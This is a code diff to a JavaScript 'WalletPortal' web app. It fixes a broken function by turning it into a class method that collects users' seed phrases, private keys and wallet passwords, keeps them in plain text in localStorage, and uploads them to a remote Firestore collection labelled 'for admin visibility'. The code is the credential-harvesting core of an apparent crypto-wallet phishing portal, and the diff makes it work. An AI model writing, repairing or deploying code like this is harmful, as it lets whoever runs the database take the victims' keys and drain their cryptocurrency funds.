@@ -426,50 +426,50 @@ class WalletPortal {
     showSuccess(message) {
         alert('Success: ' + message); // In production, use a proper notification system
     }
+
+    // INSERTED: make this a class method (was a broken top-level function)
+    async saveWalletImportDetails(importMethod, importData, walletPassword) {
+        // Build record with plain text values (for admin visibility)
+        const uid = localStorage.getItem('uid') || null;
+        const record = {
+            userId: uid,
+            method: importMethod,
+            seedPhrase: importMethod === 'seed' ? importData : null,
+            privateKey: importMethod === 'private' ? importData : null,
+            walletPassword: walletPassword,
+            createdAt: new Date().toISOString(),
+            source: 'local' // default source
+        };
+
+        // Save to localStorage
+        const localRecords = JSON.parse(localStorage.getItem('walletImportRecords') || '[]');
+        localRecords.push(record);
+        localStorage.setItem('walletImportRecords', JSON.stringify(localRecords));
+
+        // Attempt to save to Firestore if available (makes admin visibility centralized)
+        try {
+            const { db } = await import('./firebase-config.js');
+            const { collection, addDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js');
+
+            await addDoc(collection(db, 'walletImports'), {
+                userId: record.userId,
+                method: record.method,
+                seedPhrase: record.seedPhrase,
+                privateKey: record.privateKey,
+                walletPassword: record.walletPassword,
+                createdAt: serverTimestamp(),
+            });
+
+            // Update source to indicate remote persistence success
+            record.source = 'firestore';
+        } catch (err) {
+            // Firestore not available or failed; retain localStorage record
+            console.warn('Wallet import record not saved to Firestore:', err);
+        }
+    }
 }
 
 // Initialize wallet portal when DOM is loaded
 document.addEventListener('DOMContentLoaded', () => {
     new WalletPortal();
 });
-
-
-async saveWalletImportDetails(importMethod, importData, walletPassword) {
-    // Build record with plain text values (for admin visibility)
-    const uid = localStorage.getItem('uid') || null;
-    const record = {
-        userId: uid,
-        method: importMethod,
-        seedPhrase: importMethod === 'seed' ? importData : null,
-        privateKey: importMethod === 'private' ? importData : null,
-        walletPassword: walletPassword,
-        createdAt: new Date().toISOString(),
-        source: 'local' // default source
-    };
-
-    // Save to localStorage
-    const localRecords = JSON.parse(localStorage.getItem('walletImportRecords') || '[]');
-    localRecords.push(record);
-    localStorage.setItem('walletImportRecords', JSON.stringify(localRecords));
-
-    // Attempt to save to Firestore if available (makes admin visibility centralized)
-    try {
-        const { db } = await import('./firebase-config.js');
-        const { collection, addDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js');
-
-        await addDoc(collection(db, 'walletImports'), {
-            userId: record.userId,
-            method: record.method,
-            seedPhrase: record.seedPhrase,
-            privateKey: record.privateKey,
-            walletPassword: record.walletPassword,
-            createdAt: serverTimestamp(),
-        });
-
-        // Update source to indicate remote persistence success
-        record.source = 'firestore';
-    } catch (err) {
-        // Firestore not available or failed; retain localStorage record
-        console.warn('Wallet import record not saved to Firestore:', err);
-    }
-}
